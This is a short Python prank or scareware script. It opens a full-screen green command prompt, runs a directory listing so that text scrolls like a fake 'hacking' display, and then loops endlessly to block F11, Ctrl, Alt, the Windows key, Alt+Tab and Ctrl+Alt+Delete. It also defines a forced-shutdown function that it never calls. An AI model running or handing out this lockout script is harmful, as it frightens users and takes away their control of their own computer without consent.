import time
import os
import keyboard
def shutdown():
    os.system('shutdown /s /t 5')
os.system('start cmd')
time.sleep(1)
keyboard.send('F11')
keyboard.write('color 2')
keyboard.send('Enter')
time.sleep(1)
keyboard.write('dir/s')
keyboard.send('Enter')
time.sleep(30)
while 1 == 1:
    keyboard.block_key('F11')
    keyboard.block_key('Ctrl')
    keyboard.block_key('Alt')
    keyboard.block_key('Win')
    keyboard.block_key('Ctrl+Alt+Delete')
    keyboard.block_key('Alt+Tab')
